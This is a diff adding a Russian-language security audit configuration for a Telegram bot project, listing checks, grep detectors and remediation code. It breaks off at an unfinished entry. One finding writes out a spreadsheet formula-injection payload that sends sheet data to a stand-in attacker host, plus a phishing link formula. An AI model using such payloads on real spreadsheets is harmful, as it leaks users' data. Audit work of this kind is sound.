@@ -1,0 +1,1167 @@
+# ═══════════════════════════════════════════════════════════════════════════════
+# CUSTOM SECURITY & QUALITY AUDIT CONFIGURATION
+# Project  : MaminHleb_bot
+# Stack    : Node.js 18+ · Express 4 · Telegram Bot API · Google Sheets API
+#            PostgreSQL (pg) · node-fetch · helmet · express-rate-limit
+#            Telegram Mini App (bot/index.html)
+# Version  : 1.0.0
+# Updated  : 2026-06-02
+# ═══════════════════════════════════════════════════════════════════════════════
+
+meta:
+  project: "MaminHleb_bot"
+  version: "1.0.0"
+  date: "2026-06-02"
+  repository: "alexanderdashcynskiy-cell/MaminHleb_bot"
+  audit_branch: "claude/custom-security-audit-config-qr7wZ"
+  total_checks: 55
+  production_files:
+    mini_app: "bot/index.html"    # production Mini App
+    dead_file: "index.html"       # НЕ используется, мёртвый файл
+
+# ─────────────────────────────────────────────────────────────────────────────
+# УРОВНИ СЕРЬЁЗНОСТИ
+# ─────────────────────────────────────────────────────────────────────────────
+severity:
+  CRITICAL: "Эксплуатируемая уязвимость или потеря данных. Исправить немедленно."
+  HIGH:     "Серьёзный риск безопасности. Исправить в текущем спринте."
+  MEDIUM:   "Умеренный риск или деградация UX. Запланировать исправление."
+  LOW:      "Улучшение качества кода. Устранить при следующей итерации."
+  INFO:     "Наблюдение. Не требует немедленных действий."
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ИНСТРУМЕНТЫ АУДИТА
+# ─────────────────────────────────────────────────────────────────────────────
+tools:
+  eslint_security:
+    enabled: true
+    config: "eslint.config.security.js"
+    install: >
+      npm install --save-dev eslint @eslint/js
+      eslint-plugin-security eslint-plugin-no-secrets
+    run: "npx eslint --config eslint.config.security.js bot/"
+    fail_on: "error"
+
+  secretlint:
+    enabled: true
+    config: ".secretlintrc.json"
+    install: "npm install --save-dev secretlint @secretlint/secretlint-rule-preset-recommend"
+    run: "npx secretlint '**/*.{js,json}'"
+    ignores: ["node_modules", ".env.example", "*.md"]
+
+  npm_audit:
+    enabled: true
+    run: "npm audit --audit-level=moderate"
+    fail_on: "moderate"
+
+  semgrep:
+    enabled: true
+    install: "pip install semgrep"
+    rulesets:
+      - "p/javascript"
+      - "p/nodejs"
+      - "p/express"
+      - "p/owasp-top-ten"
+      - "p/secrets"
+      - "p/sql-injection"
+      - "p/xss"
+    run: "semgrep --config=auto --config=p/owasp-top-ten --error bot/"
+
+  html_audit:
+    enabled: true
+    note: "Ручная проверка bot/index.html на XSS, CSP, initData валидацию"
+    checks:
+      - "grep -n 'initDataUnsafe\\|no-cors\\|innerHTML\\|eval' bot/index.html"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 1 — КРИТИЧЕСКИЕ УЯЗВИМОСТИ (CRITICAL)
+# ═══════════════════════════════════════════════════════════════════════════════
+critical_checks:
+
+  - id: "CRIT-001"
+    title: "/webhook без проверки X-Telegram-Bot-Api-Secret-Token"
+    severity: CRITICAL
+    owasp: "A07:2021 – Identification and Authentication Failures"
+    cwe: "CWE-306: Missing Authentication for Critical Function"
+    files:
+      - { path: "bot/index.js", line: 920, pattern: "webhook" }
+    detect:
+      - "grep -n 'X-Telegram-Bot-Api-Secret-Token\\|webhook.*secret\\|secret.*webhook' bot/index.js || echo 'SECRET TOKEN CHECK MISSING'"
+    description: >
+      Без проверки X-Telegram-Bot-Api-Secret-Token любой может отправить
+      поддельный апдейт на /webhook и выполнить произвольные команды бота —
+      рассылку сообщений, изменение данных заказов, флуд.
+    remediation: |
+      const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET;
+      if (!WEBHOOK_SECRET) throw new Error('WEBHOOK_SECRET is required');
+
+      app.post('/webhook', (req, res) => {
+        const token = req.headers['x-telegram-bot-api-secret-token'];
+        if (!token || token !== WEBHOOK_SECRET) {
+          return res.status(403).json({ error: 'Forbidden' });
+        }
+        // Обработка апдейта
+      });
+
+      // При регистрации webhook:
+      await bot.setWebhook(webhookUrl, { secret_token: WEBHOOK_SECRET });
+    status: OPEN
+
+  - id: "CRIT-002"
+    title: "initDataUnsafe.user.id используется как доверенный идентификатор"
+    severity: CRITICAL
+    owasp: "A07:2021 – Identification and Authentication Failures"
+    cwe: "CWE-290: Authentication Bypass by Spoofing"
+    files:
+      - { path: "bot/index.html", line: 831, pattern: "initDataUnsafe\\.user\\.id" }
+    detect:
+      - "grep -n 'initDataUnsafe' bot/index.html | head -20"
+    description: >
+      initDataUnsafe не проверяется на подпись HMAC-SHA256.
+      Злоумышленник может подделать любой user.id, получив доступ к чужим заказам.
+      Telegram требует обязательной серверной верификации initData.
+    remediation: |
+      // ── Клиент (bot/index.html) ──────────────────────────────────────────
+      // Отправлять на сервер RAW initData (не initDataUnsafe):
+      const initData = window.Telegram.WebApp.initData; // строка, не объект
+
+      const response = await fetch('/api/verify-init-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ initData }),
+      });
+
+      // ── Сервер (bot/index.js) ────────────────────────────────────────────
+      const crypto = require('crypto');
+
+      function verifyTelegramInitData(initDataString, botToken) {
+        const params = new URLSearchParams(initDataString);
+        const hash = params.get('hash');
+        params.delete('hash');
+
+        const checkString = [...params.entries()]
+          .sort(([a], [b]) => a.localeCompare(b))
+          .map(([k, v]) => `${k}=${v}`)
+          .join('\n');
+
+        const secretKey = crypto
+          .createHmac('sha256', 'WebAppData')
+          .update(botToken)
+          .digest();
+
+        const expectedHash = crypto
+          .createHmac('sha256', secretKey)
+          .update(checkString)
+          .digest('hex');
+
+        return crypto.timingSafeEqual(
+          Buffer.from(hash, 'hex'),
+          Buffer.from(expectedHash, 'hex')
+        );
+      }
+    status: OPEN
+
+  - id: "CRIT-003"
+    title: "mode: 'no-cors' — ответ сервера никогда не читается"
+    severity: CRITICAL
+    owasp: "A04:2021 – Insecure Design"
+    cwe: "CWE-670: Always-Incorrect Control Flow Implementation"
+    files:
+      - { path: "bot/index.html", line: 2315, pattern: "no-cors" }
+    detect:
+      - "grep -n 'no-cors' bot/index.html"
+    description: >
+      fetch с mode: 'no-cors' возвращает opaque response.
+      response.ok всегда false, response.json() всегда бросает исключение.
+      Ошибки сервера бесследно исчезают, пользователь не получает обратной связи.
+    remediation: |
+      // УБРАТЬ mode: 'no-cors' — использовать обычный CORS fetch:
+      const response = await fetch('/api/orders', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        // mode: 'no-cors'  ← УДАЛИТЬ
+        body: JSON.stringify(orderData),
+      });
+
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.message ?? 'Server error');
+      }
+
+      const result = await response.json();
+    status: OPEN
+
+  - id: "CRIT-004"
+    title: "state.json на эфемерной FS Railway — данные теряются при рестарте"
+    severity: CRITICAL
+    owasp: "A04:2021 – Insecure Design"
+    cwe: "CWE-400: Uncontrolled Resource Consumption"
+    files:
+      - { path: "bot/index.js", line: 39, pattern: "state\\.json\\|readFileSync\\|writeFileSync" }
+    detect:
+      - "grep -n 'state\\.json\\|readFileSync\\|writeFileSync\\|fs\\.write' bot/index.js"
+    description: >
+      Railway использует эфемерную файловую систему. При каждом деплое или рестарте
+      state.json исчезает → потеря всех незавершённых заказов, состояния пользователей.
+    remediation: |
+      // Уже подключена pg библиотека — использовать PostgreSQL:
+      const { Pool } = require('pg');
+      const pool = new Pool({ connectionString: process.env.DATABASE_URL });
+
+      // Вместо state.json:
+      async function getState(userId) {
+        const { rows } = await pool.query(
+          'SELECT state FROM user_states WHERE user_id = $1', [userId]
+        );
+        return rows[0]?.state ?? {};
+      }
+
+      async function setState(userId, state) {
+        await pool.query(
+          `INSERT INTO user_states (user_id, state, updated_at)
+           VALUES ($1, $2, NOW())
+           ON CONFLICT (user_id) DO UPDATE
+           SET state = $2, updated_at = NOW()`,
+          [userId, JSON.stringify(state)]
+        );
+      }
+    status: OPEN
+
+  - id: "CRIT-005"
+    title: "CORS: Access-Control-Allow-Origin: * — открытый CORS"
+    severity: CRITICAL
+    owasp: "A05:2021 – Security Misconfiguration"
+    cwe: "CWE-942: Permissive Cross-domain Policy with Credentials"
+    files:
+      - { path: "bot/index.js", line: 17, pattern: "Access-Control-Allow-Origin.*\\*" }
+    detect:
+      - "grep -n 'Access-Control-Allow-Origin\\|cors' bot/index.js"
+    description: >
+      Wildcard CORS позволяет любому сайту в интернете делать запросы к API бота.
+      В сочетании с cookie/session аутентификацией — прямой вектор CSRF.
+    remediation: |
+      const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS ?? '')
+        .split(',').map(o => o.trim()).filter(Boolean);
+      // По умолчанию разрешить только Telegram:
+      const DEFAULT_ORIGINS = ['https://web.telegram.org', 'https://t.me'];
+      const origins = ALLOWED_ORIGINS.length ? ALLOWED_ORIGINS : DEFAULT_ORIGINS;
+
+      app.use(cors({
+        origin: (origin, cb) => {
+          if (!origin || origins.includes(origin)) return cb(null, true);
+          cb(new Error(`CORS blocked: ${origin}`));
+        },
+        credentials: false, // Mini App не использует cookies
+      }));
+    status: OPEN
+
+  - id: "CRIT-006"
+    title: "Formula Injection в Google Sheets — valueInputOption: USER_ENTERED"
+    severity: CRITICAL
+    owasp: "A03:2021 – Injection"
+    cwe: "CWE-1236: Improper Neutralization of Formula Elements in CSV"
+    files:
+      - { path: "bot/index.js", lines: [146, 169, 758, 907], pattern: "USER_ENTERED" }
+    detect:
+      - "grep -n 'USER_ENTERED' bot/index.js"
+    description: >
+      Пользователь вводит в заказ строку: =IMPORTRANGE("https://attacker.com/steal?data=",A1:Z100)
+      Google Sheets выполняет формулу и отправляет все данные таблицы на сервер злоумышленника.
+      Также возможно: =HYPERLINK("http://phishing.site","Нажми здесь")
+    remediation: |
+      // Заменить USER_ENTERED на RAW везде:
+      const sheets = google.sheets({ version: 'v4', auth });
+      await sheets.spreadsheets.values.update({
+        spreadsheetId,
+        range,
+        valueInputOption: 'RAW',  // ← вместо 'USER_ENTERED'
+        resource: { values },
+      });
+
+      // Если нужно сохранить форматирование чисел/дат — санитизировать:
+      function sanitizeForSheets(value) {
+        if (typeof value === 'string' && /^[=+\-@\t\r\n]/.test(value)) {
+          return `'${value}`; // Google Sheets интерпретирует ' как текст
+        }
+        return value;
+      }
+    status: OPEN
+
+  - id: "CRIT-007"
+    title: "Два расходящихся файла Mini App — bot/index.html vs index.html"
+    severity: CRITICAL
+    owasp: "A08:2021 – Software and Data Integrity Failures"
+    cwe: "CWE-441: Unintended Proxy or Intermediary"
+    files:
+      - { path: "bot/index.html", note: "PRODUCTION — раздаётся сервером" }
+      - { path: "index.html", note: "МЁРТВЫЙ — не используется в production" }
+    detect:
+      - "diff <(grep -c '') bot/index.html) <(grep -c '' index.html)"
+      - "diff bot/index.html index.html | wc -l"
+    description: >
+      bot/index.html — production файл (2341 строка).
+      index.html — мёртвый файл в корне (2440 строк), не раздаётся.
+      Разработчики путаются и вносят исправления в мёртвый файл.
+      Расхождение накапливается, исправления безопасности теряются.
+    remediation: >
+      1. Удалить /index.html из репозитория: git rm index.html
+      2. Или добавить явный комментарий: <!-- DEPRECATED: не редактировать, использовать bot/index.html -->
+      3. Добавить CI-проверку: diff bot/index.html index.html && echo "FILES DIVERGED"
+    status: OPEN
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 2 — БЕЗОПАСНОСТЬ (SECURITY)
+# ═══════════════════════════════════════════════════════════════════════════════
+security_checks:
+
+  - id: "SEC-001"
+    title: "Helmet установлен, но может быть не подключён"
+    severity: HIGH
+    owasp: "A05:2021 – Security Misconfiguration"
+    cwe: "CWE-693: Protection Mechanism Failure"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'helmet\\|require.*helmet' bot/index.js"
+    description: >
+      Пакет helmet присутствует в package.json. Убедиться, что он
+      подключён с правильной конфигурацией CSP.
+    expected_config: |
+      const helmet = require('helmet');
+      app.use(helmet({
+        contentSecurityPolicy: {
+          directives: {
+            defaultSrc: ["'self'"],
+            scriptSrc:  ["'self'", "https://telegram.org"],
+            styleSrc:   ["'self'", "'unsafe-inline'"],
+            frameSrc:   ["'none'"],
+            imgSrc:     ["'self'", "data:"],
+          }
+        },
+        hsts: { maxAge: 31536000, includeSubDomains: true },
+      }));
+    status: CHECK_REQUIRED
+
+  - id: "SEC-002"
+    title: "SQL Injection в PostgreSQL запросах (template literals)"
+    severity: CRITICAL
+    owasp: "A03:2021 – Injection"
+    cwe: "CWE-89: Improper Neutralization of Special Elements in SQL"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'query.*`\\|query.*+\\|query.*concat' bot/index.js | head -20"
+    remediation: |
+      // НЕБЕЗОПАСНО:
+      await pool.query(`SELECT * FROM orders WHERE user_id = ${userId}`);
+
+      // БЕЗОПАСНО — параметризованные запросы:
+      await pool.query('SELECT * FROM orders WHERE user_id = $1', [userId]);
+
+      // Для динамических WHERE:
+      const conditions = [];
+      const values = [];
+      if (userId) { conditions.push(`user_id = $${values.length + 1}`); values.push(userId); }
+      await pool.query(`SELECT * FROM orders WHERE ${conditions.join(' AND ')}`, values);
+    status: CHECK_REQUIRED
+
+  - id: "SEC-003"
+    title: "Rate limiting на bot API endpoints"
+    severity: HIGH
+    owasp: "A07:2021 – Identification and Authentication Failures"
+    cwe: "CWE-307: Improper Restriction of Excessive Authentication Attempts"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'rateLimit\\|rateLimiter' bot/index.js"
+    description: >
+      express-rate-limit установлен в package.json. Убедиться, что лимиты
+      применены ко всем публичным endpoint'ам, особенно /api/orders.
+    expected_config: |
+      const rateLimit = require('express-rate-limit');
+
+      const globalLimiter = rateLimit({ windowMs: 60_000, max: 100 });
+      const orderLimiter  = rateLimit({ windowMs: 60_000, max: 10,
+        message: { error: 'Too many requests' } });
+      const adminLimiter  = rateLimit({ windowMs: 15 * 60_000, max: 5 });
+
+      app.use(globalLimiter);
+      app.post('/api/orders', orderLimiter, handleOrder);
+      app.use('/api/admin', adminLimiter);
+    status: CHECK_REQUIRED
+
+  - id: "SEC-004"
+    title: "ADMIN_ID проверяется небезопасно — parseInt/string comparison"
+    severity: HIGH
+    owasp: "A07:2021 – Identification and Authentication Failures"
+    cwe: "CWE-697: Incorrect Comparison"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'ADMIN_ID\\|admin.*id\\|isAdmin' bot/index.js | head -20"
+    description: >
+      Если ADMIN_ID сравнивается через == вместо === или через parseInt,
+      возможен type coercion bypass: '123abc' == 123 → true в JS.
+    remediation: |
+      const ADMIN_ID = parseInt(process.env.ADMIN_ID ?? '0', 10);
+      if (!ADMIN_ID) throw new Error('ADMIN_ID must be set');
+
+      function isAdmin(userId) {
+        return Number.isInteger(userId) && userId === ADMIN_ID;
+      }
+    status: CHECK_REQUIRED
+
+  - id: "SEC-005"
+    title: "XSS в Mini App — innerHTML без санитизации"
+    severity: HIGH
+    owasp: "A03:2021 – Injection"
+    cwe: "CWE-79: Cross-site Scripting"
+    files:
+      - { path: "bot/index.html" }
+    detect:
+      - "grep -n 'innerHTML\\|outerHTML\\|document\\.write' bot/index.html | head -20"
+    description: >
+      Данные из Telegram initData или API ответов, вставленные через innerHTML
+      без санитизации, могут выполнить произвольный JS в контексте Mini App.
+    remediation: |
+      // Использовать textContent вместо innerHTML для текстовых данных:
+      element.textContent = userText; // безопасно
+
+      // Если нужен HTML — только с DOMPurify:
+      import DOMPurify from 'dompurify';
+      element.innerHTML = DOMPurify.sanitize(htmlContent, {
+        ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
+      });
+    status: CHECK_REQUIRED
+
+  - id: "SEC-006"
+    title: "Telegram initData: проверка auth_date на freshness"
+    severity: HIGH
+    owasp: "A07:2021 – Identification and Authentication Failures"
+    cwe: "CWE-613: Insufficient Session Expiration"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'auth_date\\|initData.*expir' bot/index.js"
+    description: >
+      Даже при корректной HMAC верификации, старые initData (>24 часов) должны
+      отклоняться. Иначе перехваченный initData остаётся валидным бесконечно.
+    remediation: |
+      function verifyTelegramInitData(initDataString, botToken) {
+        const params = new URLSearchParams(initDataString);
+        const hash = params.get('hash');
+        const authDate = parseInt(params.get('auth_date') ?? '0', 10);
+
+        // Проверка свежести — не старше 24 часов
+        const MAX_AGE_SECONDS = 24 * 60 * 60;
+        if (Date.now() / 1000 - authDate > MAX_AGE_SECONDS) {
+          throw new Error('initData expired');
+        }
+
+        // ... HMAC верификация (см. CRIT-002)
+      }
+    status: CHECK_REQUIRED
+
+  - id: "SEC-007"
+    title: "Webhook URL содержит токен бота в пути"
+    severity: HIGH
+    owasp: "A02:2021 – Cryptographic Failures"
+    cwe: "CWE-312: Cleartext Storage of Sensitive Information"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'webhook.*TOKEN\\|setWebhook.*token\\|BOT_TOKEN.*webhook' bot/index.js"
+    description: >
+      Паттерн /webhook/<BOT_TOKEN> — токен попадает в access логи nginx/CDN,
+      прокси серверов, систем мониторинга.
+    remediation: |
+      // НЕБЕЗОПАСНО:
+      app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, handler);
+
+      // БЕЗОПАСНО — использовать случайный путь + проверку secret-token header:
+      const WEBHOOK_PATH = `/webhook/${crypto.randomBytes(16).toString('hex')}`;
+      app.post(WEBHOOK_PATH, (req, res) => {
+        if (req.headers['x-telegram-bot-api-secret-token'] !== process.env.WEBHOOK_SECRET) {
+          return res.sendStatus(403);
+        }
+        // ...
+      });
+    status: CHECK_REQUIRED
+
+  - id: "SEC-008"
+    title: "TELEGRAM_BOT_TOKEN не валидируется при старте"
+    severity: MEDIUM
+    owasp: "A05:2021 – Security Misconfiguration"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'TELEGRAM_BOT_TOKEN\\|BOT_TOKEN' bot/index.js | head -5"
+    remediation: |
+      // В начале bot/index.js — fail fast при отсутствии обязательных переменных:
+      const REQUIRED_ENV = [
+        'TELEGRAM_BOT_TOKEN', 'WEBHOOK_SECRET', 'ADMIN_ID', 'DATABASE_URL'
+      ];
+      for (const key of REQUIRED_ENV) {
+        if (!process.env[key]) throw new Error(`Missing required env var: ${key}`);
+      }
+    status: CHECK_REQUIRED
+
+  - id: "SEC-009"
+    title: ".env файл не должен попасть в git"
+    severity: CRITICAL
+    owasp: "A02:2021 – Cryptographic Failures"
+    cwe: "CWE-312: Cleartext Storage of Sensitive Information"
+    detect:
+      - "cat .gitignore | grep '\\.env' || echo '.ENV NOT IN GITIGNORE'"
+      - "git ls-files | grep '^\\.env$'"
+      - "git log --all --full-history -- 'bot/.env' '.env' | head -3"
+    remediation: |
+      echo ".env" >> .gitignore
+      echo "bot/.env" >> .gitignore
+      git rm --cached .env bot/.env 2>/dev/null || true
+    status: CHECK_REQUIRED
+
+  - id: "SEC-010"
+    title: "Telegram Bot Token в логах или ответах API"
+    severity: CRITICAL
+    owasp: "A02:2021 – Cryptographic Failures"
+    cwe: "CWE-532: Insertion of Sensitive Information into Log File"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'console\\.log.*BOT_TOKEN\\|console\\.log.*TOKEN\\|res\\.json.*token' bot/index.js"
+    remediation: >
+      Никогда не логировать TELEGRAM_BOT_TOKEN, WEBHOOK_SECRET, DATABASE_URL.
+      Использовать маскировку в логгере: token.slice(0,4) + '****' + token.slice(-4)
+    status: CHECK_REQUIRED
+
+  - id: "SEC-011"
+    title: "Открытый /api/admin/checkin без проверки секрета"
+    severity: HIGH
+    owasp: "A01:2021 – Broken Access Control"
+    cwe: "CWE-306: Missing Authentication for Critical Function"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'admin.*checkin\\|checkin' bot/index.js | head -10"
+    remediation: |
+      app.post('/api/admin/checkin', (req, res, next) => {
+        const secret = req.headers['x-admin-secret'] ?? req.body.secret;
+        if (!secret || !crypto.timingSafeEqual(
+          Buffer.from(secret), Buffer.from(process.env.WEBHOOK_SECRET)
+        )) return res.status(403).json({ error: 'Forbidden' });
+        next();
+      }, handleCheckin);
+    status: CHECK_REQUIRED
+
+  - id: "SEC-012"
+    title: "Зависимости с известными CVE (npm audit)"
+    severity: HIGH
+    owasp: "A06:2021 – Vulnerable and Outdated Components"
+    cwe: "CWE-1104: Use of Unmaintained Third Party Components"
+    detect:
+      - "npm audit --audit-level=moderate"
+    remediation: >
+      npm audit fix для автоматических исправлений.
+      В CI: npm audit --audit-level=high.
+    status: CHECK_REQUIRED
+
+  - id: "SEC-013"
+    title: "node-fetch 2.x — устаревшая версия без встроенной защиты"
+    severity: MEDIUM
+    owasp: "A06:2021 – Vulnerable and Outdated Components"
+    files:
+      - { path: "package.json", pattern: "node-fetch.*2\\." }
+    detect:
+      - "grep 'node-fetch' package.json"
+    description: >
+      node-fetch 2.x не имеет встроенной защиты от redirect loops и
+      не поддерживает AbortSignal таймаут нативно.
+    remediation: >
+      Мигрировать на node-fetch 3.x (ESM only) или использовать нативный fetch
+      доступный в Node.js 18+:
+        const response = await fetch(url, { signal: AbortSignal.timeout(5000) });
+    status: CHECK_REQUIRED
+
+  - id: "SEC-014"
+    title: "PostgreSQL SSL соединение"
+    severity: HIGH
+    owasp: "A02:2021 – Cryptographic Failures"
+    cwe: "CWE-319: Cleartext Transmission of Sensitive Information"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'ssl\\|DATABASE_SSL\\|rejectUnauthorized' bot/index.js"
+    description: >
+      Соединение с PostgreSQL без SSL передаёт данные в открытом виде.
+      На Railway используется self-signed cert — нужен ssl: { rejectUnauthorized: false }.
+    remediation: |
+      const pool = new Pool({
+        connectionString: process.env.DATABASE_URL,
+        ssl: process.env.DATABASE_SSL === 'no-verify'
+          ? { rejectUnauthorized: false }
+          : process.env.DATABASE_SSL === 'verify'
+            ? { rejectUnauthorized: true }
+            : false,
+      });
+    status: CHECK_REQUIRED
+
+  - id: "SEC-015"
+    title: "Hardcoded secrets в боте"
+    severity: HIGH
+    owasp: "A02:2021 – Cryptographic Failures"
+    cwe: "CWE-798: Use of Hard-coded Credentials"
+    files:
+      - { path: "bot/index.js" }
+      - { path: "bot/config.js" }
+    detect:
+      - "npx secretlint '**/*.{js,json}'"
+      - "grep -rn \"password\\s*=\\s*['\\\"]\\|token\\s*=\\s*['\\\"]\" bot/"
+    status: CHECK_REQUIRED
+
+  - id: "SEC-016"
+    title: "Stack traces возвращаются в production ответах"
+    severity: MEDIUM
+    owasp: "A05:2021 – Security Misconfiguration"
+    cwe: "CWE-209: Generation of Error Message Containing Sensitive Information"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'err\\.stack\\|error\\.stack\\|message.*stack' bot/index.js"
+    remediation: |
+      app.use((err, req, res, next) => {
+        console.error(err); // логировать полностью на сервере
+        if (process.env.NODE_ENV === 'production') {
+          res.status(500).json({ error: 'Internal server error' });
+        } else {
+          res.status(500).json({ error: err.message, stack: err.stack });
+        }
+      });
+    status: CHECK_REQUIRED
+
+  - id: "SEC-017"
+    title: "IDOR — доступ к чужим заказам по order ID"
+    severity: HIGH
+    owasp: "A01:2021 – Broken Access Control"
+    cwe: "CWE-639: Authorization Bypass Through User-Controlled Key"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'order.*id\\|orderId\\|req\\.params' bot/index.js | head -20"
+    remediation: |
+      // Всегда фильтровать по userId:
+      const order = await pool.query(
+        'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
+        [orderId, verifiedUserId]
+      );
+    status: CHECK_REQUIRED
+
+  - id: "SEC-018"
+    title: "Content-Security-Policy для Mini App (bot/index.html)"
+    severity: HIGH
+    owasp: "A05:2021 – Security Misconfiguration"
+    cwe: "CWE-693: Protection Mechanism Failure"
+    files:
+      - { path: "bot/index.html" }
+    detect:
+      - "grep -n 'Content-Security-Policy\\|meta.*csp' bot/index.html"
+    remediation: |
+      <!-- В <head> bot/index.html: -->
+      <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self';
+                 script-src 'self' https://telegram.org;
+                 style-src 'self' 'unsafe-inline';
+                 img-src 'self' data: https:;
+                 connect-src 'self' https://api.telegram.org;
+                 frame-src 'none';">
+    status: OPEN
+
+  - id: "SEC-019"
+    title: "eval() и Function() в Mini App"
+    severity: HIGH
+    owasp: "A03:2021 – Injection"
+    cwe: "CWE-95: Improper Neutralization of Directives in Eval"
+    files:
+      - { path: "bot/index.html" }
+    detect:
+      - "grep -n '\\beval\\b\\|new Function\\b\\|setTimeout.*['\"]' bot/index.html"
+    status: CHECK_REQUIRED
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 3 — КАЧЕСТВО КОДА (CODE QUALITY)
+# ═══════════════════════════════════════════════════════════════════════════════
+quality_checks:
+
+  - id: "QUAL-001"
+    title: "bot/index.js 1195 строк — монолитный файл"
+    severity: MEDIUM
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "wc -l bot/index.js"
+    remediation: >
+      Разбить на модули: bot/handlers/, bot/api/, bot/db/, bot/utils/.
+      Каждый модуль < 300 строк.
+    status: OPEN
+
+  - id: "QUAL-002"
+    title: "bot/index.html 2341 строк — монолитный Mini App файл"
+    severity: MEDIUM
+    files:
+      - { path: "bot/index.html" }
+    detect:
+      - "wc -l bot/index.html"
+    remediation: >
+      Разбить встроенный JS на отдельные файлы в bot/public/js/.
+      Использовать сборщик (Vite/esbuild) для Mini App.
+    status: INFO
+
+  - id: "QUAL-003"
+    title: "Мёртвый файл index.html в корне репозитория"
+    severity: MEDIUM
+    files:
+      - { path: "index.html" }
+    detect:
+      - "ls index.html 2>/dev/null && echo 'DEAD FILE EXISTS'"
+      - "grep -rn 'index\\.html' bot/index.js | grep -v 'bot/index\\.html'"
+    remediation: >
+      git rm index.html — удалить мёртвый файл.
+      Оставить только bot/index.html.
+    status: OPEN
+
+  - id: "QUAL-004"
+    title: "Отсутствие ESLint конфигурации"
+    severity: MEDIUM
+    detect:
+      - "ls .eslintrc* eslint.config.* 2>/dev/null || echo 'NO ESLINT'"
+    status: OPEN
+
+  - id: "QUAL-005"
+    title: "Отсутствие обработки ошибок в async/await без try-catch"
+    severity: MEDIUM
+    cwe: "CWE-755: Improper Handling of Exceptional Conditions"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -c 'await' bot/index.js"
+      - "grep -c 'try' bot/index.js"
+    description: >
+      Непойманные Promise rejection crashes Node.js процесс.
+      Каждый await должен быть обёрнут в try-catch.
+    remediation: |
+      process.on('unhandledRejection', (reason, promise) => {
+        console.error('Unhandled rejection:', reason);
+        // НЕ завершать процесс — логировать и продолжать
+      });
+    status: CHECK_REQUIRED
+
+  - id: "QUAL-006"
+    title: "Graceful shutdown не реализован"
+    severity: MEDIUM
+    cwe: "CWE-400: Uncontrolled Resource Consumption"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'SIGTERM\\|SIGINT\\|graceful' bot/index.js"
+    remediation: |
+      process.on('SIGTERM', async () => {
+        console.log('Shutting down gracefully...');
+        await pool.end();
+        server.close(() => process.exit(0));
+      });
+    status: CHECK_REQUIRED
+
+  - id: "QUAL-007"
+    title: "config.js — проверить наличие хардкод значений"
+    severity: MEDIUM
+    files:
+      - { path: "bot/config.js" }
+    detect:
+      - "cat bot/config.js"
+      - "grep -n 'password\\|token\\|secret\\|key' bot/config.js"
+    status: CHECK_REQUIRED
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 4 — ПРОИЗВОДИТЕЛЬНОСТЬ (PERFORMANCE)
+# ═══════════════════════════════════════════════════════════════════════════════
+performance_checks:
+
+  - id: "PERF-001"
+    title: "N+1 запросы к Google Sheets API"
+    severity: HIGH
+    cwe: "CWE-400: Uncontrolled Resource Consumption"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -c 'spreadsheets\\.values\\|getRows\\|append\\|update' bot/index.js"
+    remediation: >
+      Использовать batchGet/batchUpdate.
+      Кэшировать конфигурацию продуктов в памяти с TTL 10 минут.
+    status: CHECK_REQUIRED
+
+  - id: "PERF-002"
+    title: "Нет connection pool timeout для PostgreSQL"
+    severity: MEDIUM
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'connectionTimeoutMillis\\|idleTimeoutMillis\\|max:' bot/index.js"
+    remediation: |
+      const pool = new Pool({
+        connectionString: process.env.DATABASE_URL,
+        max: 10,
+        idleTimeoutMillis: 30_000,
+        connectionTimeoutMillis: 5_000,
+      });
+    status: CHECK_REQUIRED
+
+  - id: "PERF-003"
+    title: "Fetch без timeout — зависание при недоступности внешних API"
+    severity: MEDIUM
+    cwe: "CWE-400: Uncontrolled Resource Consumption"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'fetch(\\|node-fetch' bot/index.js | grep -v 'AbortSignal\\|timeout\\|signal' | head -10"
+    remediation: |
+      // Node.js 18+ встроенный fetch с таймаутом:
+      const response = await fetch(url, {
+        signal: AbortSignal.timeout(10_000), // 10 секунд
+      });
+    status: CHECK_REQUIRED
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 5 — ТЕЛЕГРАМ BOT СПЕЦИФИЧНЫЕ ПРОВЕРКИ
+# ═══════════════════════════════════════════════════════════════════════════════
+telegram_specific_checks:
+
+  - id: "TG-001"
+    title: "Long polling вместо webhook — inefficient для production"
+    severity: MEDIUM
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'getUpdates\\|polling\\|startPolling' bot/index.js"
+    remediation: >
+      На Railway использовать webhook (уже настроен).
+      Убедиться, что polling полностью отключён в production.
+    status: CHECK_REQUIRED
+
+  - id: "TG-002"
